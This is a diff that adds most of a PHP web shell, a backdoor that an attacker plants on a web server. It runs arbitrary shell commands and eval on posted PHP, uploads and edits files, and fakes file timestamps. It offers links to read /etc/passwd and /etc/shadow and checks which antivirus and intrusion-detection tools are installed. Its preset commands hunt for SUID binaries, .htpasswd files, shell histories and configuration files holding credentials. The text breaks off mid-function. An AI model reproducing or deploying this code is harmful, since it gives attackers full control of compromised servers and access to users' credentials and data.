+    function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;} 
+    function set(a,c,p1,p2,p3,charset) { 
+        if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_; 
+        if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_; 
+        if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_; 
+        if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_; 
+        if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_; 
+        d.mf.a.value = encrypt(d.mf.a.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."'); 
+        d.mf.c.value = encrypt(d.mf.c.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."'); 
+        d.mf.p1.value = encrypt(d.mf.p1.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."'); 
+        d.mf.p2.value = encrypt(d.mf.p2.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."'); 
+        d.mf.p3.value = encrypt(d.mf.p3.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."'); 
+        if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_; 
+    } 
+    function g(a,c,p1,p2,p3,charset) { 
+        set(a,c,p1,p2,p3,charset); 
+        d.mf.submit(); 
+    } 
+    function a(a,c,p1,p2,p3,charset) { 
+        set(a,c,p1,p2,p3,charset); 
+        var params = 'ajax=true'; 
+        for(i=0;i<d.mf.elements.length;i++) 
+            params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value); 
+        sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params); 
+    } 
+    function sr(url, params) { 
+        if (window.XMLHttpRequest) 
+            req = new XMLHttpRequest(); 
+        else if (window.ActiveXObject) 
+            req = new ActiveXObject('Microsoft.XMLHTTP'); 
+        if (req) { 
+            req.onreadystatechange = processReqChange; 
+            req.open('POST', url, true); 
+            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded'); 
+            req.send(params); 
+        } 
+    } 
+    function processReqChange() { 
+        if( (req.readyState == 4) ) 
+            if(req.status == 200) { 
+                var reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm'); 
+                var arr=reg.exec(req.responseText); 
+                eval(arr[2].substr(0, arr[1])); 
+            } else alert('Request error!'); 
+    } 
+</script> 
+<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'> 
+<form method=post name=mf style='display:none;'> 
+<input type=hidden name=a> 
+<input type=hidden name=c> 
+<input type=hidden name=p1> 
+<input type=hidden name=p2> 
+<input type=hidden name=p3> 
+<input type=hidden name=charset> 
+</form>"; 
+    $freeSpace = @diskfreespace($GLOBALS['cwd']); 
+    $totalSpace = @disk_total_space($GLOBALS['cwd']); 
+    $totalSpace = $totalSpace?$totalSpace:1; 
+    $release = @php_uname('r'); 
+    $kernel = @php_uname('s'); 
+    $explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description='; 
+    if(strpos('Linux', $kernel) !== false) 
+        $explink .= urlencode('Linux Kernel ' . substr($release,0,6)); 
+    else 
+        $explink .= urlencode($kernel . ' ' . substr($release,0,3)); 
+    if(!function_exists('posix_getegid')) { 
+        $user = @get_current_user(); 
+        $uid = @getmyuid(); 
+        $gid = @getmygid(); 
+        $group = "?"; 
+    } else { 
+        $uid = @posix_getpwuid(@posix_geteuid()); 
+        $gid = @posix_getgrgid(@posix_getegid()); 
+        $user = $uid['name']; 
+        $uid = $uid['uid']; 
+        $group = $gid['name']; 
+        $gid = $gid['gid']; 
+    } 
+    $cwd_links = ''; 
+    $path = explode("/", $GLOBALS['cwd']); 
+    $n=count($path); 
+    for($i=0; $i<$n-1; $i++) { 
+        $cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\""; 
+        for($j=0; $j<=$i; $j++) 
+            $cwd_links .= $path[$j].'/'; 
+        $cwd_links .= "\")'>".$path[$i]."/</a>"; 
+    } 
+    $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866'); 
+    $opt_charsets = ''; 
+    foreach($charsets as $▟) 
+        $opt_charsets .= '<option value="'.$▟.'" '.($_POST['charset']==$▟?'selected':'').'>'.$▟.'</option>'; 
+    $m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network'); 
+    if(!empty($GLOBALS['▛'])) 
+    $m['Logout'] = 'Logout'; 
+    $m['Self remove'] = 'SelfRemove'; 
+    $menu = ''; 
+    foreach($m as $k => $v) 
+        $menu .= '<th>[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>'; 
+    $drives = ""; 
+    if ($GLOBALS['os'] == 'win') { 
+        foreach(range('c','z') as $drive) 
+        if (is_dir($drive.':\\')) 
+            $drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> '; 
+    } 
+    /* (С) 08.2015 dmkcv */ 
+    echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'. 
+         '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'. 
+         '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'. 
+         '<table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>'; 
+} 
+function hardFooter() { 
+    $is_writable = is_writable($GLOBALS['cwd'])?" <font color='#FFDB5F'>[ Writeable ]</font>":" <font color=red>(Not writable)</font>"; 
+    echo " 
+</div> 
+<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%> 
+    <tr> 
+        <td><form onsubmit=\"".( function_exists('actionFilesMan')? "g(null,this.c.value,'');":'' )."return false;\"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='submit'></form></td> 
+        <td><form onsubmit=\"".(function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value);":'' )."return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td> 
+    </tr><tr> 
+        <td><form onsubmit=\"".( function_exists('actionFilesMan')? "g('FilesMan',null,'mkdir',this.d.value);":'' )."return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td> 
+        <td><form onsubmit=\"".( function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value,'mkfile');":'' )."return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td> 
+    </tr><tr> 
+        <td><form onsubmit=\"".( function_exists('actionConsole')? "g('Console',null,this.c.value);":'' )."return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td> 
+        <td><form method='post' ".( (!function_exists('actionFilesMan'))? " onsubmit=\"return false;\" ":'' )."ENCTYPE='multipart/form-data'> 
+        <input type=hidden name=a value='FilesMan'> 
+        <input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'> 
+        <input type=hidden name=p1 value='uploadFile'> 
+        <input type=hidden name=ne value=''> 
+        <input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'> 
+        <span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td> 
+    </tr></table></div> 
+    <!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script> 
+    <script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script> 
+    </body></html>"; 
+} 
+if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} } 
+if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} } 
+function ex($in) { 
+    $▖ = ''; 
+    if (function_exists('exec')) { 
+        @exec($in,$▖); 
+        $▖ = @join("\n",$▖); 
+    } elseif (function_exists('passthru')) { 
+        ob_start(); 
+        @passthru($in); 
+        $▖ = ob_get_clean(); 
+    } elseif (function_exists('system')) { 
+        ob_start(); 
+        @system($in); 
+        $▖ = ob_get_clean(); 
+    } elseif (function_exists('shell_exec')) { 
+        $▖ = shell_exec($in); 
+    } elseif (is_resource($f = @popen($in,"r"))) { 
+        $▖ = ""; 
+        while(!@feof($f)) 
+            $▖ .= fread($f,1024); 
+        pclose($f); 
+    }else return "↳ Unable to execute command\n"; 
+    return ($▖==''?"↳ Query did not return anything\n":$▖); 
+} 
+function viewSize($s) { 
+    if($s >= 1073741824) 
+        return sprintf('%1.2f', $s / 1073741824 ). ' GB'; 
+    elseif($s >= 1048576) 
+        return sprintf('%1.2f', $s / 1048576 ) . ' MB'; 
+    elseif($s >= 1024) 
+        return sprintf('%1.2f', $s / 1024 ) . ' KB'; 
+    else 
+        return $s . ' B'; 
+} 
+function perms($p) { 
+    if (($p & 0xC000) == 0xC000)$i = 's'; 
+    elseif (($p & 0xA000) == 0xA000)$i = 'l'; 
+    elseif (($p & 0x8000) == 0x8000)$i = '-'; 
+    elseif (($p & 0x6000) == 0x6000)$i = 'b'; 
+    elseif (($p & 0x4000) == 0x4000)$i = 'd'; 
+    elseif (($p & 0x2000) == 0x2000)$i = 'c'; 
+    elseif (($p & 0x1000) == 0x1000)$i = 'p'; 
+    else $i = 'u'; 
+    $i .= (($p & 0x0100) ? 'r' : '-'); 
+    $i .= (($p & 0x0080) ? 'w' : '-'); 
+    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-')); 
+    $i .= (($p & 0x0020) ? 'r' : '-'); 
+    $i .= (($p & 0x0010) ? 'w' : '-'); 
+    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-')); 
+    $i .= (($p & 0x0004) ? 'r' : '-'); 
+    $i .= (($p & 0x0002) ? 'w' : '-'); 
+    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-')); 
+    return $i; 
+} 
+function viewPermsColor($f) { 
+    if (!@is_readable($f)) 
+        return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>'; 
+    elseif (!@is_writable($f)) 
+        return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>'; 
+    else 
+        return '<font color=#FFDB5F><b>'.perms(@fileperms($f)).'</b></font>'; 
+} 
+function hardScandir($dir) { 
+    if(function_exists("scandir")) { 
+        return scandir($dir); 
+    } else { 
+        $dh  = opendir($dir); 
+        while (false !== ($filename = readdir($dh))) 
+            $files[] = $filename; 
+        return $files; 
+    } 
+} 
+function which($p) { 
+    $path = ex('which ' . $p); 
+    if(!empty($path)) 
+        return $path; 
+    return false; 
+} 
+function actionRC() { 
+    if(!@$_POST['p1']) { 
+        $a = array( 
+            "uname" => php_uname(), 
+            "php_version" => phpversion(), 
+            "VERSION" => VERSION, 
+            "safemode" => @ini_get('safe_mode') 
+        ); 
+        echo serialize($a); 
+    } else { 
+        eval($_POST['p1']); 
+    } 
+} 
+function prototype($k, $v) { 
+    $_COOKIE[$k] = $v; 
+    setcookie($k, $v); 
+} 
+function actionSecInfo() { 
+    hardHeader(); 
+    echo '<h1>Server security information</h1><div class=content>'; 
+    function showSecParam($n, $v) { 
+        $v = trim($v); 
+        if($v) { 
+            echo '<span>' . $n . ': </span>'; 
+            if(strpos($v, "\n") === false) 
+                echo $v . '<br>'; 
+            else 
+                echo '<pre class=ml1>' . $v . '</pre>'; 
+        } 
+    } 
+    showSecParam('Server software', @getenv('SERVER_SOFTWARE')); 
+    if(function_exists('apache_get_modules')) 
+        showSecParam('Loaded Apache modules', implode(', ', apache_get_modules())); 
+    showSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none'); 
+    showSecParam('Open base dir', @ini_get('open_basedir')); 
+    showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir')); 
+    showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir')); 
+    showSecParam('cURL support', function_exists('curl_version')?'enabled':'no'); 
+    $temp=array(); 
+    if(function_exists('mysql_get_client_info')) 
+        $temp[] = "MySql (".mysql_get_client_info().")"; 
+    if(function_exists('mssql_connect')) 
+        $temp[] = "MSSQL"; 
+    if(function_exists('pg_connect')) 
+        $temp[] = "PostgreSQL"; 
+    if(function_exists('oci_connect')) 
+        $temp[] = "Oracle"; 
+    showSecParam('Supported databases', implode(', ', $temp)); 
+    echo '<br>'; 
+    if($GLOBALS['os'] == 'nix') { 
+            showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no'); 
+            showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no'); 
+            showSecParam('OS version', @file_get_contents('/proc/version')); 
+            showSecParam('Distr name', @file_get_contents('/etc/issue.net')); 
+            if(!$GLOBALS['safe_mode']) { 
+                $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl'); 
+                $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
+                $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror'); 
+                echo '<br>'; 
+                $temp=array(); 
+                foreach ($userful as $▟) 
+                    if(which($▟)) 
+                        $temp[] = $▟; 
+                showSecParam('Userful', implode(', ',$temp)); 
+                $temp=array(); 
+                foreach ($danger as $▟) 
+                    if(which($▟)) 
+                        $temp[] = $▟; 
+                showSecParam('Danger', implode(', ',$temp)); 
+                $temp=array(); 
+                foreach ($downloaders as $▟) 
+                    if(which($▟)) 
+                        $temp[] = $▟; 
+                showSecParam('Downloaders', implode(', ',$temp)); 
+                echo '<br/>'; 
+                showSecParam('HDD space', ex('df -h')); 
+                showSecParam('Hosts', @file_get_contents('/etc/hosts')); 
+                showSecParam('Mount options', @file_get_contents('/etc/fstab')); 
+            } 
+    } else { 
+        showSecParam('OS Version',ex('ver')); 
+        showSecParam('Account Settings', iconv('CP866', 'UTF-8',ex('net accounts'))); 
+        showSecParam('User Accounts', iconv('CP866', 'UTF-8',ex('net user'))); 
+    } 
+    echo '</div>'; 
+    hardFooter(); 
+} 
+function actionFilesTools() { 
+    if( isset($_POST['p1']) ) 
+        $_POST['p1'] = urldecode($_POST['p1']); 
+    if(@$_POST['p2']=='download') { 
+        if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) { 
+            ob_start("ob_gzhandler", 4096); 
+            header("Content-Disposition: attachment; filename=".basename($_POST['p1'])); 
+            if (function_exists("mime_content_type")) { 
+                $type = @mime_content_type($_POST['p1']); 
+                header("Content-Type: " . $type); 
+            } else 
+                header("Content-Type: application/octet-stream"); 
+            $fp = @fopen($_POST['p1'], "r"); 
+            if($fp) { 
+                while(!@feof($fp)) 
+                    echo @fread($fp, 1024); 
+                fclose($fp); 
+            } 
+        }exit; 
+    } 
+    if( @$_POST['p2'] == 'mkfile' ) { 
+        if(!file_exists($_POST['p1'])) { 
+            $fp = @fopen($_POST['p1'], 'w'); 
+            if($fp) { 
+                $_POST['p2'] = "edit"; 
+                fclose($fp); 
+            } 
+        } 
+    } 
+    hardHeader(); 
+    echo '<h1>File tools</h1><div class=content>'; 
+    if( !file_exists(@$_POST['p1']) ) { 
+        echo 'File not exists'; 
+        hardFooter(); 
+        return; 
+    } 
+    $uid = @posix_getpwuid(@fileowner($_POST['p1'])); 
+    if(!$uid) { 
+        $uid['name'] = @fileowner($_POST['p1']); 
+        $gid['name'] = @filegroup($_POST['p1']); 
+    } else $gid = @posix_getgrgid(@filegroup($_POST['p1'])); 
+    echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>'; 
+    echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>'; 
+    if( empty($_POST['p2']) ) 
+        $_POST['p2'] = 'view'; 
+    if( is_file($_POST['p1']) ) 
+        $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame'); 
+    else 
+        $m = array('Chmod', 'Rename', 'Touch'); 
+    foreach($m as $v) 
+        echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> '; 
+    echo '<br><br>'; 
+    switch($_POST['p2']) { 
+        case 'view': 
+            echo '<pre class=ml1>'; 
+            $fp = @fopen($_POST['p1'], 'r'); 
+            if($fp) { 
+                while( !@feof($fp) ) 
+                    echo htmlspecialchars(@fread($fp, 1024)); 
+                @fclose($fp); 
+            } 
+            echo '</pre>'; 
+            break; 
+        case 'highlight': 
+            if( @is_readable($_POST['p1']) ) { 
+                echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">'; 
+                $oRb = @highlight_file($_POST['p1'],true); 
+                echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$oRb).'</div>'; 
+            } 
+            break; 
+        case 'chmod': 
+            if( !empty($_POST['p3']) ) { 
+                $perms = 0; 
+                for($i=strlen($_POST['p3'])-1;$i>=0;--$i) 
+                    $perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1)); 
+                if(!@chmod($_POST['p1'], $perms)) 
+                    echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>'; 
+            } 
+            clearstatcache(); 
+            echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value="submit"></form>'; 
+            break; 
+        case 'edit': 
+            if( !is_writable($_POST['p1'])) { 
+                echo 'File isn\'t writeable'; 
+                break; 
+            } 
+            if( !empty($_POST['p3']) ) { 
+                $time = @filemtime($_POST['p1']); 
+                $_POST['p3'] = substr($_POST['p3'],1); 
+                $fp = @fopen($_POST['p1'],"w"); 
+                if($fp) { 
+                    @fwrite($fp,$_POST['p3']); 
+                    @fclose($fp); 
+                    echo 'Saved!<br><script>p3_="";</script>'; 
+                    @touch($_POST['p1'],$time,$time); 
+                } 
+            } 
+            echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>'; 
+            $fp = @fopen($_POST['p1'], 'r'); 
+            if($fp) { 
+                while( !@feof($fp) ) 
+                    echo htmlspecialchars(@fread($fp, 1024)); 
+                @fclose($fp); 
+            } 
+            echo '</textarea><input type=submit value="submit"></form>'; 
+            break; 
+        case 'hexdump': 
+            $c = @file_get_contents($_POST['p1']); 
+            $n = 0; 
+            $h = array('00000000<br>','',''); 
+            $len = strlen($c); 
+            for ($i=0; $i<$len; ++$i) { 
+                $h[1] .= sprintf('%02X',ord($c[$i])).' '; 
+                switch ( ord($c[$i]) ) { 
+                    case 0:  $h[2] .= ' '; break; 
+                    case 9:  $h[2] .= ' '; break; 
+                    case 10: $h[2] .= ' '; break; 
+                    case 13: $h[2] .= ' '; break; 
+                    default: $h[2] .= $c[$i]; break; 
+                } 
+                $n++; 
+                if ($n == 32) { 
+                    $n = 0; 
+                    if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';} 
+                    $h[1] .= '<br>'; 
+                    $h[2] .= "\n"; 
+                } 
+             } 
+            echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#202832><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#060a10><pre>'.$h[1].'</pre></td><td bgcolor=#202832><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>'; 
+            break; 
+        case 'rename': 
+            if( !empty($_POST['p3']) ) { 
+                if(!@rename($_POST['p1'], $_POST['p3'])) 
+                    echo 'Can\'t rename!<br>'; 
+                else 
+                    die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>'); 
+            } 
+            echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value="submit"></form>'; 
+            break; 
+        case 'touch': 
+            if( !empty($_POST['p3']) ) { 
+                $time = strtotime($_POST['p3']); 
+                if($time) { 
+                    if(!touch($_POST['p1'],$time,$time)) 
+                        echo 'Fail!'; 
+                    else 
+                        echo 'Touched!'; 
+                } else echo 'Bad time format!'; 
+            } 
+            clearstatcache(); 
+            echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value="submit"></form>'; 
+            break; 
+        /* (С) 12.2015 mitryz */ 
+        case 'frame': 
+            $frameSrc = substr(htmlspecialchars($GLOBALS['cwd']), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT']))); 
+            if ($frameSrc[0] != '/') 
+                $frameSrc = '/' . $frameSrc; 
+            if ($frameSrc[strlen($frameSrc) - 1] != '/') 
+                $frameSrc = $frameSrc . '/'; 
+            $frameSrc = $frameSrc . htmlspecialchars($_POST['p1']); 
+            echo '<iframe width="100%" height="900px" scrolling="no" src='.$frameSrc.' onload="onload=height=contentDocument.body.scrollHeight"></iframe>'; 
+            break; 
+    } 
+    echo '</div>'; 
+    hardFooter(); 
+} 
+if($os == 'win') 
+    $aliases = array( 
+        "List Directory" => "dir", 
+        "Find index.php in current dir" => "dir /s /w /b index.php", 
+        "Find *config*.php in current dir" => "dir /s /w /b *config*.php", 
+        "Show active connections" => "netstat -an", 
+        "Show running services" => "net start", 
+        "User accounts" => "net user", 
+        "Show computers" => "net view", 
+        "ARP Table" => "arp -a", 
+        "IP Configuration" => "ipconfig /all" 
+    ); 
+else 
+    $aliases = array( 
+          "List dir" => "ls -lha", 
+        "list file attributes on a Linux second extended file system" => "lsattr -va", 
+          "show opened ports" => "netstat -an | grep -i listen", 
+        "process status" => "ps aux", 
+        "Find" => "", 
+          "find all suid files" => "find / -type f -perm -04000 -ls", 
+          "find suid files in current dir" => "find . -type f -perm -04000 -ls", 
+          "find all sgid files" => "find / -type f -perm -02000 -ls", 
+          "find sgid files in current dir" => "find . -type f -perm -02000 -ls", 
+          "find config.inc.php files" => "find / -type f -name config.inc.php", 
+          "find config* files" => "find / -type f -name \"config*\"", 
+          "find config* files in current dir" => "find . -type f -name \"config*\"", 
+          "find all writable folders and files" => "find / -perm -2 -ls", 
+          "find all writable folders and files in current dir" => "find . -perm -2 -ls", 
+          "find all service.pwd files" => "find / -type f -name service.pwd", 
+          "find service.pwd files in current dir" => "find . -type f -name service.pwd", 
+          "find all .htpasswd files" => "find / -type f -name .htpasswd", 
+          "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", 
+          "find all .bash_history files" => "find / -type f -name .bash_history", 
+          "find .bash_history files in current dir" => "find . -type f -name .bash_history", 
+          "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc", 
+          "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", 
+        "Locate" => "", 
+          "locate httpd.conf files" => "locate httpd.conf", 
+        "locate vhosts.conf files" => "locate vhosts.conf", 
+        "locate proftpd.conf files" => "locate proftpd.conf", 
+        "locate psybnc.conf files" => "locate psybnc.conf", 
+        "locate my.conf files" => "locate my.conf", 
+        "locate admin.php files" =>"locate admin.php", 
+        "locate cfg.php files" => "locate cfg.php", 
+        "locate conf.php files" => "locate conf.php", 
+        "locate config.dat files" => "locate config.dat", 
+        "locate config.php files" => "locate config.php", 
+        "locate config.inc files" => "locate config.inc", 
+        "locate config.inc.php" => "locate config.inc.php", 
+        "locate config.default.php files" => "locate config.default.php", 
+        "locate config* files " => "locate config", 
+        "locate .conf files"=>"locate '.conf'", 
+        "locate .pwd files" => "locate '.pwd'", 
+        "locate .sql files" => "locate '.sql'", 
+        "locate .htpasswd files" => "locate '.htpasswd'", 
+        "locate .bash_history files" => "locate '.bash_history'", 
+        "locate .mysql_history files" => "locate '.mysql_history'", 
+        "locate .fetchmailrc files" => "locate '.fetchmailrc'", 
+        "locate backup files" => "locate backup", 
+        "locate dump files" => "locate dump", 
+        "locate priv files" => "locate priv" 
+    ); 
+function actionConsole() { 
+    if(!empty($_POST['p1']) && !empty($_POST['p2'])) { 
+        prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true); 
+        $_POST['p1'] .= ' 2>&1'; 
+    } elseif(!empty($_POST['p1'])) 
+        prototype(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0); 
+    if(isset($_POST['ajax'])) { 
+        prototype(md5($_SERVER['HTTP_HOST']).'ajax', true); 
+        ob_start(); 
+        echo "d.cf.cmd.value='';\n"; 
+        $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\'\0")); 
+        if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))    { 
+            if(@chdir($match[1])) { 
+                $GLOBALS['cwd'] = @getcwd(); 
+                echo "c_='".$GLOBALS['cwd']."';"; 
+            } 
+        } 
+        echo "d.cf.output.value+='".$temp."';"; 
+        echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;"; 
+        $temp = ob_get_clean(); 
+        echo strlen($temp), "\n", $temp; 
+        exit; 
+    } 
+    if(empty($_POST['ajax'])&&!empty($_POST['p1'])) 
+        prototype(md5($_SERVER['HTTP_HOST']).'ajax', 0); 
+    hardHeader(); 
+    echo "<script> 
+if(window.Event) window.captureEvents(Event.KEYDOWN); 
+var cmds = new Array(''); 
+var cur = 0; 
+function kp(e) { 
+    var n = (window.Event) ? e.which : e.keyCode; 
+    if(n == 38) { 
